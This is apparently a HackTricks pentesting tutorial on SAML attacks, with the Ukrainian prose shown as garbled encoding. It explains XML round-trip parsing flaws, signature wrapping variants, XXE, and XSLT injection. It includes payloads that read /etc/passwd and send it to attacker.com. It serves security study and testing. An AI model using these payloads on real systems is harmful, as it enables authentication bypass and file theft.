# SAML Attacks

## SAML Attacks

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}

## Basic Information

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Tool

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –º–æ–∂–µ –≤–∑—è—Ç–∏ URL –∞–±–æ —Å–ø–∏—Å–æ–∫ URL —ñ –≤–∏–≤–µ—Å—Ç–∏ SAML consume URL.

## XML round-trip

–í XML –ø—ñ–¥–ø–∏—Å–∞–Ω–∞ —á–∞—Å—Ç–∏–Ω–∞ XML –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤ –ø–∞–º'—è—Ç—ñ, –ø–æ—Ç—ñ–º –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –¥–µ—è–∫–µ –∫–æ–¥—É–≤–∞–Ω–Ω—è/–¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è, —ñ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –ø—ñ–¥–ø–∏—Å. –í —ñ–¥–µ–∞–ª—ñ —Ü–µ –∫–æ–¥—É–≤–∞–Ω–Ω—è/–¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è –Ω–µ –ø–æ–≤–∏–Ω–Ω–æ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –¥–∞–Ω—ñ, –∞–ª–µ –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ü—å–æ–≥–æ —Å—Ü–µ–Ω–∞—Ä—ñ—é, **–¥–∞–Ω—ñ, —â–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å—Å—è, —ñ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ –¥–∞–Ω—ñ –º–æ–∂—É—Ç—å –Ω–µ –±—É—Ç–∏ –æ–¥–Ω–∞–∫–æ–≤–∏–º–∏**.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∫–æ–¥:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
–í–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–∏ –ø—Ä–æ—Ç–∏ REXML 3.2.4 –∞–±–æ —Ä–∞–Ω—ñ—à–µ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –≤–∏—Ö–æ–¥—É –∑–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ:
```
First child in original doc: Y
First child after round-trip: Z
```
–¶–µ —Ç–µ, —è–∫ REXML –ø–æ–±–∞—á–∏–≤ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π XML –¥–æ–∫—É–º–µ–Ω—Ç –∑ –ø—Ä–æ–≥—Ä–∞–º–∏ –≤–∏—â–µ:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (1001).png>)

–ê —Ü–µ —Ç–µ, —è–∫ –≤—ñ–Ω –ø–æ–±–∞—á–∏–≤ –π–æ–≥–æ –ø—ñ—Å–ª—è –µ—Ç–∞–ø—É –ø–∞—Ä—Å–∏–Ω–≥—É —Ç–∞ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (445).png>)

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Ç–∞ —Å–ø–æ—Å–æ–±–∏ —ó—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## –ê—Ç–∞–∫–∏ –Ω–∞ –æ–±–≥–æ—Ä—Ç–∫—É XML-–ø—ñ–¥–ø–∏—Å—É

–£ **–∞—Ç–∞–∫–∞—Ö –Ω–∞ –æ–±–≥–æ—Ä—Ç–∫—É XML-–ø—ñ–¥–ø–∏—Å—É (XSW)** –ø—Ä–æ—Ç–∏–≤–Ω–∏–∫–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—Ç—å –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, —â–æ –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ XML –¥–æ–∫—É–º–µ–Ω—Ç–∏ –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è —á–µ—Ä–µ–∑ –¥–≤–∞ —Ä—ñ–∑–Ω—ñ –µ—Ç–∞–ø–∏: **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø—ñ–¥–ø–∏—Å—É** —Ç–∞ **–≤–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ—ó**. –¶—ñ –∞—Ç–∞–∫–∏ –ø–µ—Ä–µ–¥–±–∞—á–∞—é—Ç—å –∑–º—ñ–Ω—É —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ XML –¥–æ–∫—É–º–µ–Ω—Ç–∞. –ó–æ–∫—Ä–µ–º–∞, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ **–≤–ø—Ä–æ–≤–∞–¥–∂—É—î –ø—ñ–¥—Ä–æ–±–ª–µ–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∏**, —è–∫—ñ –Ω–µ –ø–æ—Ä—É—à—É—é—Ç—å –¥—ñ–π—Å–Ω—ñ—Å—Ç—å XML –ø—ñ–¥–ø–∏—Å—É. –¶—è –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—è –º–∞—î –Ω–∞ –º–µ—Ç—ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ä–æ–∑–±—ñ–∂–Ω—ñ—Å—Ç—å –º—ñ–∂ –µ–ª–µ–º–µ–Ω—Ç–∞–º–∏, —è–∫—ñ –∞–Ω–∞–ª—ñ–∑—É—é—Ç—å—Å—è **–ª–æ–≥—ñ–∫–æ—é –ø—Ä–æ–≥—Ä–∞–º–∏**, —Ç–∞ —Ç–∏–º–∏, —â–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å—Å—è **–º–æ–¥—É–ª–µ–º –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—ñ–¥–ø–∏—Å—É**. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ, —Ö–æ—á–∞ XML –ø—ñ–¥–ø–∏—Å –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è —Ç–µ—Ö–Ω—ñ—á–Ω–æ –¥—ñ–π—Å–Ω–∏–º —ñ –ø—Ä–æ—Ö–æ–¥–∏—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É, –ª–æ–≥—ñ–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–∏ –æ–±—Ä–æ–±–ª—è—î **—Ñ–∞–ª—å—à–∏–≤—ñ –µ–ª–µ–º–µ–Ω—Ç–∏**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –æ–±—Ö–æ–¥–∏—Ç—å **–∑–∞—Ö–∏—Å—Ç —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ** —Ç–∞ **–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è** XML –ø—ñ–¥–ø–∏—Å—É, —â–æ –¥–æ–∑–≤–æ–ª—è—î **–≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç** –±–µ–∑ –≤–∏—è–≤–ª–µ–Ω–Ω—è.

–ù–∞—Å—Ç—É–ø–Ω—ñ –∞—Ç–∞–∫–∏ –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ [**—Ü—å–æ–º—É –±–ª–æ–∑—ñ**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **—Ç–∞** [**—Ü—å–æ–º—É –¥–æ–∫—É–º–µ–Ω—Ç—ñ**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf). –¢–æ–∂ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —ó—Ö –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –¥–µ—Ç–∞–ª–µ–π.

### XSW #1

* **–°—Ç—Ä–∞—Ç–µ–≥—ñ—è**: –î–æ–¥–∞—î—Ç—å—Å—è –Ω–æ–≤–∏–π –∫–æ—Ä–µ–Ω–µ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç, —â–æ –º—ñ—Å—Ç–∏—Ç—å –ø—ñ–¥–ø–∏—Å.
* **–ù–∞—Å–ª—ñ–¥–æ–∫**: –í–∞–ª—ñ–¥–∞—Ç–æ—Ä –º–æ–∂–µ –∑–∞–ø–ª—É—Ç–∞—Ç–∏—Å—è –º—ñ–∂ –ª–µ–≥—ñ—Ç–∏–º–Ω–∏–º "Response -> Assertion -> Subject" —Ç–∞ "–∑–ª–æ–≤–º–∏—Å–Ω–∏–º –Ω–æ–≤–∏–º Response -> Assertion -> Subject", —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø—Ä–æ–±–ª–µ–º –∑ —Ü—ñ–ª—ñ—Å–Ω—ñ—Å—Ç—é –¥–∞–Ω–∏—Ö.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (506).png>)

### XSW #2

* **–í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –≤—ñ–¥ XSW #1**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤—ñ–¥–æ–∫—Ä–µ–º–ª–µ–Ω–∏–π –ø—ñ–¥–ø–∏—Å –∑–∞–º—ñ—Å—Ç—å –æ–±–≥–æ—Ä—Ç–∫–æ–≤–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É.
* **–ù–∞—Å–ª—ñ–¥–æ–∫**: "–ó–ª–æ–≤–º–∏—Å–Ω–∞" —Å—Ç—Ä—É–∫—Ç—É—Ä–∞, –ø–æ–¥—ñ–±–Ω–æ –¥–æ XSW #1, –º–∞—î –Ω–∞ –º–µ—Ç—ñ –æ–±–º–∞–Ω—É—Ç–∏ –±—ñ–∑–Ω–µ—Å-–ª–æ–≥—ñ–∫—É –ø—ñ—Å–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (466).png>)

### XSW #3

* **–°—Ç—Ä–∞—Ç–µ–≥—ñ—è**: –°—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –∑–ª–æ–≤–º–∏—Å–Ω–∞ Assertion –Ω–∞ —Ç–æ–º—É –∂ —ñ—î—Ä–∞—Ä—Ö—ñ—á–Ω–æ–º—É —Ä—ñ–≤–Ω—ñ, —â–æ –π –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ assertion.
* **–ù–∞—Å–ª—ñ–¥–æ–∫**: –ú–∞—î –Ω–∞ –º–µ—Ç—ñ –∑–∞–ø–ª—É—Ç–∞—Ç–∏ –±—ñ–∑–Ω–µ—Å-–ª–æ–≥—ñ–∫—É, —â–æ–± –≤–æ–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∞ —à–∫—ñ–¥–ª–∏–≤—ñ –¥–∞–Ω—ñ.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (120).png>)

### XSW #4

* **–í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –≤—ñ–¥ XSW #3**: –û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ Assertion —Å—Ç–∞—î –¥–æ—á—ñ—Ä–Ω—ñ–º –µ–ª–µ–º–µ–Ω—Ç–æ–º –¥—É–±–ª—ñ–∫–∞—Ç—É (–∑–ª–æ–≤–º–∏—Å–Ω–æ—ó) Assertion.
* **–ù–∞—Å–ª—ñ–¥–æ–∫**: –ü–æ–¥—ñ–±–Ω–æ –¥–æ XSW #3, –∞–ª–µ –±—ñ–ª—å—à –∞–≥—Ä–µ—Å–∏–≤–Ω–æ –∑–º—ñ–Ω—é—î —Å—Ç—Ä—É–∫—Ç—É—Ä—É XML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (551).png>)

### XSW #5

* **–£–Ω—ñ–∫–∞–ª—å–Ω–∏–π –∞—Å–ø–µ–∫—Ç**: –ù—ñ –ø—ñ–¥–ø–∏—Å, –Ω—ñ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ Assertion –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–º –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è–º (–æ–±–≥–æ—Ä—Ç–∫–æ–≤–∏–π/–æ–±–≥–æ—Ä—Ç–∫–æ–≤–∏–π/–≤—ñ–¥–æ–∫—Ä–µ–º–ª–µ–Ω–∏–π).
* **–ù–∞—Å–ª—ñ–¥–æ–∫**: –°–∫–æ–ø—ñ–π–æ–≤–∞–Ω–∞ Assertion –æ–±–≥–æ—Ä—Ç–∞—î –ø—ñ–¥–ø–∏—Å, –∑–º—ñ–Ω—é—é—á–∏ –æ—á—ñ–∫—É–≤–∞–Ω—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É –¥–æ–∫—É–º–µ–Ω—Ç–∞.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (1030).png>)

### XSW #6

* **–°—Ç—Ä–∞—Ç–µ–≥—ñ—è**: –°—Ö–æ–∂–∞ –≤—Å—Ç–∞–≤–∫–∞ –º—ñ—Å—Ü—è, —è–∫ —É XSW #4 —Ç–∞ #5, –∞–ª–µ –∑ –æ–±–µ—Ä—Ç–æ–º.
* **–ù–∞—Å–ª—ñ–¥–æ–∫**: –°–∫–æ–ø—ñ–π–æ–≤–∞–Ω–∞ Assertion –æ–±–≥–æ—Ä—Ç–∞—î –ø—ñ–¥–ø–∏—Å, —è–∫–∏–π –ø–æ—Ç—ñ–º –æ–±–≥–æ—Ä—Ç–∞—î –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—É Assertion, —Å—Ç–≤–æ—Ä—é—é—á–∏ –≤–∫–ª–∞–¥–µ–Ω—É –æ–º–∞–Ω–ª–∏–≤—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (169).png>)

### XSW #7

* **–°—Ç—Ä–∞—Ç–µ–≥—ñ—è**: –í—Å—Ç–∞–≤–ª—è—î—Ç—å—Å—è –µ–ª–µ–º–µ–Ω—Ç Extensions –∑ –∫–æ–ø—ñ–π–æ–≤–∞–Ω–æ—é Assertion —è–∫ –¥–æ—á—ñ—Ä–Ω—ñ–º.
* **–ù–∞—Å–ª—ñ–¥–æ–∫**: –¶–µ –µ–∫—Å–ø–ª—É–∞—Ç—É—î –º–µ–Ω—à –æ–±–º–µ–∂—É–≤–∞–ª—å–Ω—É —Å—Ö–µ–º—É –µ–ª–µ–º–µ–Ω—Ç–∞ Extensions, —â–æ–± –æ–±—ñ–π—Ç–∏ –∫–æ–Ω—Ç—Ä–∑–∞—Ö–æ–¥–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Å—Ö–µ–º–∏, –æ—Å–æ–±–ª–∏–≤–æ –≤ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ OpenSAML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (971).png>)

### XSW #8

* **–í—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –≤—ñ–¥ XSW #7**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —ñ–Ω—à–∏–π –º–µ–Ω—à –æ–±–º–µ–∂—É–≤–∞–ª—å–Ω–∏–π XML –µ–ª–µ–º–µ–Ω—Ç –¥–ª—è –≤–∞—Ä—ñ–∞–Ω—Ç—É –∞—Ç–∞–∫–∏.
* **–ù–∞—Å–ª—ñ–¥–æ–∫**: –û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ Assertion —Å—Ç–∞—î –¥–æ—á—ñ—Ä–Ω—ñ–º –µ–ª–µ–º–µ–Ω—Ç–æ–º –º–µ–Ω—à –æ–±–º–µ–∂—É–≤–∞–ª—å–Ω–æ–≥–æ –µ–ª–µ–º–µ–Ω—Ç–∞, –∑–º—ñ–Ω—é—é—á–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—É –≤ XSW #7.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (541).png>)

### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) –¥–ª—è –ø–∞—Ä—Å–∏–Ω–≥—É –∑–∞–ø–∏—Ç—É, –∑–∞—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è –±—É–¥—å-—è–∫–æ—ó –∞—Ç–∞–∫–∏ XSW, —è–∫—É –≤–∏ –≤–∏–±–µ—Ä–µ—Ç–µ, —Ç–∞ —ó—ó –∑–∞–ø—É—Å–∫—É.

## XXE

–Ø–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —è–∫—ñ –≤–∏–¥–∏ –∞—Ç–∞–∫ —î XXE, –±—É–¥—å –ª–∞—Å–∫–∞, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —î **–∑–º–µ–Ω—à–µ–Ω–∏–º–∏ —Ç–∞ –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–º–∏ –≤ base64 XML –¥–æ–∫—É–º–µ–Ω—Ç–∞–º–∏** —ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–º–∏ –¥–æ –∞—Ç–∞–∫ XML External Entity (XXE). –ú–∞–Ω—ñ–ø—É–ª—é—é—á–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä–æ—é XML SAML –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –Ω–∞–º–∞–≥–∞—Ç–∏—Å—è –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ XXE. –û—Å—å —è–∫ —Ç–∞–∫–∞ –∞—Ç–∞–∫–∞ –º–æ–∂–µ –±—É—Ç–∏ –≤—ñ–∑—É–∞–ª—ñ–∑–æ–≤–∞–Ω–∞:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Tools

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó POC –∑ SAML –∑–∞–ø–∏—Ç—É –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ –º–æ–∂–ª–∏–≤—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ XXE —Ç–∞ SAML –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.

–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ç–∞–∫–æ–∂ —Ü—é –¥–æ–ø–æ–≤—ñ–¥—å: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ XSLT –ø–µ—Ä–µ–π–¥—ñ—Ç—å –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

–ü–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ä–æ–∑—à–∏—Ä—é–≤–∞–ª—å–Ω–æ—ó —Ç–∞–±–ª–∏—Ü—ñ —Å—Ç–∏–ª—ñ–≤ (XSLT) –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è XML –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤ —É —Ä—ñ–∑–Ω—ñ —Ñ–æ—Ä–º–∞—Ç–∏, —Ç–∞–∫—ñ —è–∫ HTML, JSON –∞–±–æ PDF. –í–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ **–ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è XSLT –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –¥–æ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ü–∏—Ñ—Ä–æ–≤–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É**. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∞—Ç–∞–∫–∞ –º–æ–∂–µ –±—É—Ç–∏ —É—Å–ø—ñ—à–Ω–æ—é –Ω–∞–≤—ñ—Ç—å –±–µ–∑ –¥—ñ–π—Å–Ω–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É; —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π –∞–±–æ –Ω–µ–¥—ñ–π—Å–Ω–∏–π –ø—ñ–¥–ø–∏—Å —î –¥–æ—Å—Ç–∞—Ç–Ω—ñ–º –¥–ª—è –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è.

–¢—É—Ç –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **POC** –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –Ω–∞ —Ç–∞–∫—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ hacktricks, –∑–≥–∞–¥–∞–Ω—ñ–π –Ω–∞ –ø–æ—á–∞—Ç–∫—É —Ü—å–æ–≥–æ —Ä–æ–∑–¥—ñ–ª—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫–æ—Ä–∏—Å–Ω—ñ payloads.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Tool

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó POC –∑ SAML –∑–∞–ø–∏—Ç—É –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –º–æ–∂–ª–∏–≤–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π XSLT.

–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ç–∞–∫–æ–∂ —Ü—é –¥–æ–ø–æ–≤—ñ–¥—å: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Signature Exclusion <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

